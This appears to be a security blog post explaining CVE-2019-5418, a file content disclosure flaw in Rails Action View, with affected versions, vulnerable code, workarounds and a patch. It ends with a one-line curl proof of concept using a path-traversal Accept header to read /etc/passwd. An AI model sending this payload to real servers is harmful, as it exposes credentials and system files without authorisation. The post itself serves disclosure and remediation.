---
layout: post
title:  "CVE-2019-5418"
summary: "File Content Disclosure in Action View"
date: 2019-03-23 00:13:37
image: /assets/profile.png
author: tim_koopmans
categories: ruby
tags:
 - security
---
# tl;dr
If you use `render file:` in your controllers on affected versions of Rails, it is possible for attackers to read arbitrary files on your file system, including application code, credentials and sensitive operating system files.
{: .critical }

[CVE-2019-5418](https://github.com/advisories/GHSA-86g5-2wh3-gc9j) published on Mar 14, 2019 â€¢ updated on Jul 4, 2019

<table>
  <thead>
    <tr>
      <th>Packages</th>
      <th>Affected versions</th>
      <th>Patched versions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>actionview (RubyGems)</td>
      <td>
        All
      </td>
      <td>
         6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, 4.2.11.1
      </td>
    </tr>
  </tbody>
</table>

# Impact

There is a possible file content disclosure vulnerability in Action View.
Specially crafted accept headers in combination with calls to render `file:`
can cause arbitrary files on the target server to be rendered, disclosing the
file contents.

The impact is limited to calls to render which render file contents without
a specified accept format. Impacted code in a controller looks something like
this:

```ruby
class UserController < ApplicationController
  def index
    render file: "#{Rails.root}/some/file"
  end
end
```
# Workarounds

This vulnerability can be mitigated by specifying a format for file rendering,
like this:

```ruby
class UserController < ApplicationController
  def index
    render file: "#{Rails.root}/some/file", formats: [:html]
  end
end
```

In summary, impacted calls to render look like this:

```ruby
render file: "#{Rails.root}/some/file"
```

The vulnerability can be mitigated by changing to this:

```ruby
render file: "#{Rails.root}/some/file", formats: [:html]
```

Other calls to render are not impacted.

Alternatively, the following monkey patch can be applied in an initializer:

```ruby
ActionDispatch::Request.prepend(Module.new do
  def formats
    super().select do |format|
      format.symbol || format.ref == "*/*"
    end
  end
end)
```

# The Juicy Details

Calls which send a specially crafted `Accept` header, can exploit a flaw in the `ActionView::PathResolver` class, in particular, the way in which template paths are queried in the [<mark>find_template_paths</mark>](https://github.com/rails/rails/blob/v5.2.1/actionview/lib/action_view/template/resolver.rb#L246-L252) method.

## Proof of Concept

The Attack can be simulated, using curl and this example Docker image

{% highlight bash %}
{% raw %}
curl -H 'Accept: ../../../../../../../../etc/passwd{{' http://target/users
{% endraw %}
{% endhighlight %}

